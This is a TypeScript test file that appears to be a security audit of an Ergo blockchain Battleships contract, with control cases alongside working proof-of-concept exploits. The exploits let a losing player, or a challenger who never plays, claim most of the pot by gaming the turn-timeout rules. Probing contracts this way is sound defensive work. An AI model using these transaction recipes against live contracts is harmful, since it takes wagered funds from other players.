/**
 * Adversarial PoCs around the timeout machinery of the Sigma Fleet contracts.
 *
 * Harness: reduce + sign. `ReducedTransaction.from_unsigned_tx` alone does NOT fail on a
 * script that reduces to false; only `sign_reduced_transaction` throws
 * "Script reduced to false". Every PoC below therefore signs.
 *
 * Probe result (tests/zz_adv_probe_height.test.ts): the HEIGHT the script sees equals the
 * `height` argument handed to the synthetic state context, and `HEIGHT > timeoutHeight`
 * flips exactly at timeoutHeight == HEIGHT - 1 / HEIGHT. The harness is therefore exact to
 * the block.
 *
 * A1  ACTION 2 pays by phase, never by score: the player who has been beaten 10-0 sweeps
 *     the entire pot one block after the winner's turn clock lapses.
 * A2  Control for A1 at HEIGHT == timeoutHeight (must be rejected).
 * A3  The winner's honest ACTION 1 claim on the very same box also signs -> a pure race,
 *     and ACTION 1 carries no timeout guard at all so both remain valid forever.
 * B1  Lobby accept may set the game clock to the FLOOR of the legal window,
 *     HEIGHT + timeoutBlocks - 10 == HEIGHT + 20, not the nominal HEIGHT + 30.
 * B2  Control for B1 one block below the floor (must be rejected).
 * B3  ...after which the accepting attacker sweeps 99% of the pot from a host who never
 *     had a chance to move: the post-accept state has both histories zeroed, so
 *     honestScore is 0 == 0 and no game play is required at all.
 */
import { describe, it, expect } from 'vitest';
import * as wasm from 'ergo-lib-wasm-nodejs';
import {
  ErgoAddress, SColl, SInt, SByte, SGroupElement, OutputBuilder, TransactionBuilder,
} from '@fleet-sdk/core';
import { hexToBytes, bytesToHex } from '@noble/hashes/utils.js';
import { serializeBox } from '@fleet-sdk/serializer';
import { generateBoardCommitment, hashBlake2b256, generateMerkleProof } from '../src/lib/crypto/merkle';
import {
  buildClaimTimeoutTx, buildClaimWinTx, getBattleshipsErgoTree, getBattleshipsAddress,
  getLobbyErgoTree, normalizeInputBox, DEFAULT_DEV_PK,
} from '../src/lib/blockchain/fleet';

const DEV_PK = DEFAULT_DEV_PK;
const WAGER = 1000000000n; // 1 ERG each
const POT = WAGER * 2n;
const TB = 30; // timeout blocks, the client default (DEV_CONFIG.TIMEOUT_BLOCKS)
const FEE = 1100000n;

// ---------------------------------------------------------------- harness
function stateCtx(height: number) {
  const hs: any[] = [];
  for (let i = 0; i < 10; i++) {
    hs.push({
      extensionId: '00'.repeat(32), difficulty: '1', votes: '000000', timestamp: Date.now() - i * 120000,
      size: 1000, stateRoot: '00'.repeat(33), height: height - i, nBits: 100000, version: 2,
      id: (i + 1).toString(16).padStart(64, '0'), adProofsRoot: '00'.repeat(32),
      transactionsRoot: '00'.repeat(32), extensionHash: '00'.repeat(32),
      parentId: (i + 2).toString(16).padStart(64, '0'),
      powSolutions: {
        pk: '0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798',
        w: '0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798',
        n: '0000000000000000', d: 0,
      },
    });
  }
  const bh = wasm.BlockHeaders.from_json(hs);
  return new wasm.ErgoStateContext(wasm.PreHeader.from_block_header(bh.get(0)), bh, wasm.Parameters.default_parameters());
}
const s = (o: any) => JSON.stringify(o, (_: any, v: any) => (typeof v === 'bigint' ? v.toString() : v));
function reduceAndSign(tx: any, boxes: any[], sk: any, height: number) {
  const utx = wasm.UnsignedTransaction.from_json(s(tx.toPlainObject ? tx.toPlainObject() : tx));
  const bs = wasm.ErgoBoxes.empty();
  for (const b of boxes) bs.add(wasm.ErgoBox.from_json(s(b)));
  const reduced = wasm.ReducedTransaction.from_unsigned_tx(utx, bs, wasm.ErgoBoxes.empty(), stateCtx(height));
  const secrets = new wasm.SecretKeys();
  secrets.add(sk);
  return wasm.Wallet.from_secrets(secrets).sign_reduced_transaction(reduced);
}
function withId(b: any) { b.boxId = bytesToHex(hashBlake2b256(serializeBox(b).toBytes())); return b; }
function utxo(addr: string, v: bigint, h: number, tag = 'ab') {
  return withId({
    value: v.toString(), ergoTree: ErgoAddress.fromBase58(addr).ergoTree, assets: [],
    creationHeight: h, additionalRegisters: {}, transactionId: tag.repeat(32), index: 0,
  });
}
const hist = (cells: number[]) => { const a = new Array(64).fill(0); cells.forEach((c) => (a[c] = 1)); return a; };

// ---------------------------------------------------------------- actors
const p1Secret = wasm.SecretKey.dlog_from_bytes(hexToBytes('11'.repeat(32)));      // host / P1
const p1Addr = ErgoAddress.fromBase58(p1Secret.get_address().to_base58(wasm.NetworkPrefix.Mainnet));
const p1Pk = bytesToHex(p1Addr.getPublicKeys()[0]);
const p2Secret = wasm.SecretKey.dlog_from_bytes(hexToBytes('22'.repeat(32)));      // challenger / P2
const p2Addr = ErgoAddress.fromBase58(p2Secret.get_address().to_base58(wasm.NetworkPrefix.Mainnet));
const p2Pk = bytesToHex(p2Addr.getPublicKeys()[0]);

const g1 = new Array(64).fill(0); [0, 1, 2, 3, 4, 16, 17, 18, 32, 33].forEach((c) => (g1[c] = 1));
const g2 = new Array(64).fill(0); [8, 9, 10, 11, 12, 24, 25, 26, 40, 41].forEach((c) => (g2[c] = 1));
const com1 = generateBoardCommitment(g1, '11'.repeat(32)); // P1's real fleet
const com2 = generateBoardCommitment(g2, '22'.repeat(32)); // P2's real fleet

function gameBox(o: {
  phase: number; p1Hits: number; p2Hits: number; pending: number[];
  p1History: number[]; p2History: number[]; timeoutHeight: number; height: number;
}) {
  return withId({
    value: POT.toString(), ergoTree: getBattleshipsErgoTree().toHex(), assets: [], creationHeight: o.height,
    additionalRegisters: {
      R4: SColl(SGroupElement, [hexToBytes(p1Pk), hexToBytes(p2Pk), hexToBytes(DEV_PK)]).toHex(),
      R5: SColl(SColl(SByte), [
        Array.from(hexToBytes(com1.rootHex)), Array.from(hexToBytes(com2.rootHex)),
        Array.from(hexToBytes(com1.boardHashHex)), Array.from(hexToBytes(com2.boardHashHex)),
      ]).toHex(),
      R6: SColl(SInt, [o.phase, o.p1Hits, o.p2Hits]).toHex(),
      R7: SColl(SInt, o.pending).toHex(),
      R8: SColl(SColl(SByte), [o.p1History, o.p2History]).toHex(),
      R9: SColl(SInt, [o.timeoutHeight, TB]).toHex(),
    },
    transactionId: 'cd'.repeat(32), index: 0,
  });
}

// ================================================================= A. loser sweeps
describe('A. ACTION 2 decides by phase, not by score', () => {
  const H = 1250000;
  // P2 has sunk every one of P1's ten ship cells (p2Hits == 10) -> P2 has won.
  // P1 has scored nothing (p1Hits == 0); the five cells still pending in R7 are all water.
  const p2Fired = [0, 1, 2, 3, 4, 16, 17, 18, 32, 33];         // exactly P1's fleet
  const p1Fired = [48, 49, 56, 57, 58, 59, 60, 61, 62, 63];     // all water on P2's board
  const pending = [56, 57, 58, 59, 60];                          // P1's last salvo, in flight
  const st = {
    phase: 1,           // P2 to move: it is the WINNER's turn, so the clock is on the winner
    p1Hits: 0, p2Hits: 10,
    pending,
    p1History: hist(p1Fired), p2History: hist(p2Fired),
    height: H - 50,
  };

  it('A1 EXPLOIT: the 0-10 loser sweeps 99% of the pot one block after the winner clock lapses', () => {
    const gb = gameBox({ ...st, timeoutHeight: H - 1 }); // HEIGHT > timeoutHeight
    const u = utxo(p1Addr.encode(), 20000000n, H - 50);
    // Winner selection in ACTION 2 is `if (phase == 0) p2Prop else p1Prop` -> phase 1 pays P1.
    const tx = buildClaimTimeoutTx({
      claimerAddress: p1Addr.encode(), gameBox: gb, rawBoard: com1.saltedBoardPayload,
      currentHeight: H, userUtxos: [u as any], isP1Claiming: true,
    });
    const signed = reduceAndSign(tx, [gb, u], p1Secret, H);
    const out0 = JSON.parse(signed.outputs().get(0).to_json());
    expect(out0.ergoTree).toBe(p1Addr.ergoTree);                       // paid to the LOSER
    expect(BigInt(out0.value)).toBeGreaterThanOrEqual(POT - POT / 100n); // 1.98 ERG of a 2 ERG pot
  });

  it('A2 CONTROL: the identical sweep at HEIGHT == timeoutHeight is rejected', () => {
    const gb = gameBox({ ...st, timeoutHeight: H });
    const u = utxo(p1Addr.encode(), 20000000n, H - 50);
    const tx = buildClaimTimeoutTx({
      claimerAddress: p1Addr.encode(), gameBox: gb, rawBoard: com1.saltedBoardPayload,
      currentHeight: H, userUtxos: [u as any], isP1Claiming: true,
    });
    expect(() => reduceAndSign(tx, [gb, u], p1Secret, H)).toThrow(/reduced to false/i);
  });

  it('A3 RACE: the winner ACTION 1 claim on the same box is also valid, and has no clock at all', () => {
    const gb = gameBox({ ...st, timeoutHeight: H - 1 });
    const u = utxo(p2Addr.encode(), 20000000n, H - 50);
    const tx = buildClaimWinTx({
      winnerAddress: p2Addr.encode(), isTie: false, gameBox: gb,
      rawBoard: com2.saltedBoardPayload, currentHeight: H, userUtxos: [u as any], isP1Claiming: false,
    });
    const signed = reduceAndSign(tx, [gb, u], p2Secret, H);
    const out0 = JSON.parse(signed.outputs().get(0).to_json());
    expect(out0.ergoTree).toBe(p2Addr.ergoTree);
    expect(BigInt(out0.value)).toBeGreaterThanOrEqual(POT - POT / 100n);
  });
});

// ================================================================= B. accept snipe
describe('B. lobby accept lets the challenger pick the floor of the clock, then sweep', () => {
  const H = 1250000;

  function lobbyBox(value: bigint) {
    return withId({
      value: value.toString(), ergoTree: getLobbyErgoTree().toHex(), assets: [], creationHeight: H - 5000,
      additionalRegisters: {
        R4: SColl(SGroupElement, [hexToBytes(p1Pk), hexToBytes(DEV_PK)]).toHex(),
        R5: SColl(SColl(SByte), [
          Array.from(hexToBytes(com1.rootHex)), Array.from(hexToBytes(com1.boardHashHex)),
        ]).toHex(),
        R6: SColl(SInt, []).toHex(),
        R7: SColl(SByte, []).toHex(),
        R8: SColl(SByte, Array.from(hashBlake2b256(hexToBytes(getBattleshipsErgoTree().toHex())))).toHex(),
        R9: SInt(TB).toHex(),
      },
      transactionId: '44'.repeat(32), index: 0,
    });
  }

  function acceptTx(clock: number) {
    const lb = lobbyBox(WAGER);
    const fund = utxo(p2Addr.encode(), WAGER + 50000000n, H - 10, 'ee');
    const game = new OutputBuilder(POT, getBattleshipsAddress()).setAdditionalRegisters({
      R4: SColl(SGroupElement, [hexToBytes(p1Pk), hexToBytes(p2Pk), hexToBytes(DEV_PK)]).toHex(),
      R5: SColl(SColl(SByte), [
        Array.from(hexToBytes(com1.rootHex)), Array.from(hexToBytes(com2.rootHex)),
        Array.from(hexToBytes(com1.boardHashHex)), Array.from(hexToBytes(com2.boardHashHex)),
      ]).toHex(),
      R6: SColl(SInt, [0, 0, 0]).toHex(),
      R7: SColl(SInt, []).toHex(),
      R8: SColl(SColl(SByte), [Array(64).fill(0), Array(64).fill(0)]).toHex(),
      R9: SColl(SInt, [clock, TB]).toHex(),
    });
    const tx = new TransactionBuilder(H)
      .from([{ ...normalizeInputBox(lb as any), extension: { 0: SByte(1).toHex() } } as any, normalizeInputBox(fund as any) as any])
      .to(game)
      .sendChangeTo(p2Addr.encode())
      .payFee(FEE)
      .build();
    return { tx, inputs: [lb, fund] };
  }

  it('B1 EXPLOIT: accept with the clock at the FLOOR, HEIGHT + 20 rather than the nominal HEIGHT + 30', () => {
    const { tx, inputs } = acceptTx(H + TB - 10);
    const signed = reduceAndSign(tx, inputs, p2Secret, H);
    expect(signed.outputs().get(0).value().as_i64().to_str()).toBe(POT.toString());
  });

  it('B2 CONTROL: one block below the floor (HEIGHT + 19) is rejected', () => {
    const { tx, inputs } = acceptTx(H + TB - 11);
    expect(() => reduceAndSign(tx, inputs, p2Secret, H)).toThrow(/reduced to false/i);
  });

  it('B3 EXPLOIT: 21 blocks after acceptance the challenger sweeps the pot; the host never moved', () => {
    const clock = H + TB - 10;         // set in B1
    const sweepAt = clock + 1;         // first block where HEIGHT > timeoutHeight
    // The post-accept state verbatim: phase 0, no hits, no salvo, both histories all zero.
    const gb = gameBox({
      phase: 0, p1Hits: 0, p2Hits: 0, pending: [],
      p1History: hist([]), p2History: hist([]), timeoutHeight: clock, height: H,
    });
    const u = utxo(p2Addr.encode(), 20000000n, H, 'ff');
    const tx = buildClaimTimeoutTx({
      claimerAddress: p2Addr.encode(), gameBox: gb, rawBoard: com2.saltedBoardPayload,
      currentHeight: sweepAt, userUtxos: [u as any], isP1Claiming: false,
    });
    const signed = reduceAndSign(tx, [gb, u], p2Secret, sweepAt);
    const out0 = JSON.parse(signed.outputs().get(0).to_json());
    expect(out0.ergoTree).toBe(p2Addr.ergoTree);
    expect(BigInt(out0.value)).toBeGreaterThanOrEqual(POT - POT / 100n);
    // honestScore held trivially: opponentTrueHits == 0 == p1Hits, because p1History is all zeroes.
  });

  it('B4 CONTROL: the same sweep one block earlier (HEIGHT == timeoutHeight) is rejected', () => {
    const clock = H + TB - 10;
    const gb = gameBox({
      phase: 0, p1Hits: 0, p2Hits: 0, pending: [],
      p1History: hist([]), p2History: hist([]), timeoutHeight: clock, height: H,
    });
    const u = utxo(p2Addr.encode(), 20000000n, H, 'ff');
    const tx = buildClaimTimeoutTx({
      claimerAddress: p2Addr.encode(), gameBox: gb, rawBoard: com2.saltedBoardPayload,
      currentHeight: clock, userUtxos: [u as any], isP1Claiming: false,
    });
    expect(() => reduceAndSign(tx, [gb, u], p2Secret, clock)).toThrow(/reduced to false/i);
  });
});

// ================================================================= C. concede + floor clock
/**
 * The compounded form of A: the LOSING player is the one who computes the salvo that puts the
 * winner on ten hits, and the very same ACTION 0 transaction sets the winner's deadline. Rule 7
 * lets the mover choose anything in [HEIGHT + tb - 10, HEIGHT + tb + 4], so the loser hands the
 * winner the shortest legal window (20 blocks with the client default tb = 30) and then waits
 * with the A1 sweep ready. Cost of the option: one miner fee.
 */
describe('C. the conceding loser sets the winner clock to the floor', () => {
  const H = 1250000;
  const pending = [16, 17, 18, 50, 51];                                   // 3 ship cells + 2 water
  const p2Fired = [0, 1, 2, 3, 4, 32, 33, ...pending];                     // 7 recorded + 3 new = 10
  const p1Fired = [40, 41, 42, 43, 44];

  function concedeTx(clock: number) {
    const gb = gameBox({
      phase: 0, p1Hits: 4, p2Hits: 7, pending,
      p1History: hist(p1Fired), p2History: hist(p2Fired),
      timeoutHeight: H + 5, height: H - 30,
    });
    const u = utxo(p1Addr.encode(), 20000000n, H - 30, 'bb');
    const ext: Record<number, string> = { 0: SByte(0).toHex() };
    pending.forEach((cell, i) => {
      const pr = generateMerkleProof(cell, com1.rawLeaves, com1.tree);
      ext[i + 1] = SColl(SByte, Array.from(pr.proofBytes)).toHex();
    });
    const out = new OutputBuilder(POT, getBattleshipsAddress()).setAdditionalRegisters({
      R4: gb.additionalRegisters.R4,
      R5: gb.additionalRegisters.R5,
      R6: SColl(SInt, [1, 4, 10]).toHex(),   // phase -> P2, p2Hits -> 10
      R7: SColl(SInt, []).toHex(),           // p2AlreadyWon: the empty concede salvo
      R8: gb.additionalRegisters.R8,
      R9: SColl(SInt, [clock, TB]).toHex(),
    });
    const tx = new TransactionBuilder(H)
      .from([{ ...normalizeInputBox(gb as any), extension: ext } as any, normalizeInputBox(u as any) as any])
      .to(out).sendChangeTo(p1Addr.encode()).payFee(FEE).build();
    return { tx, inputs: [gb, u] };
  }

  it('C1 EXPLOIT: the concede turn is accepted with the winner clock at HEIGHT + 20', () => {
    const { tx, inputs } = concedeTx(H + TB - 10);
    const signed = reduceAndSign(tx, inputs, p1Secret, H);
    const out0 = JSON.parse(signed.outputs().get(0).to_json());
    expect(out0.ergoTree).toBe(getBattleshipsErgoTree().toHex());
  });

  it('C2 CONTROL: the same concede turn with a clock one block shorter is rejected', () => {
    const { tx, inputs } = concedeTx(H + TB - 11);
    expect(() => reduceAndSign(tx, inputs, p1Secret, H)).toThrow(/reduced to false/i);
  });
});
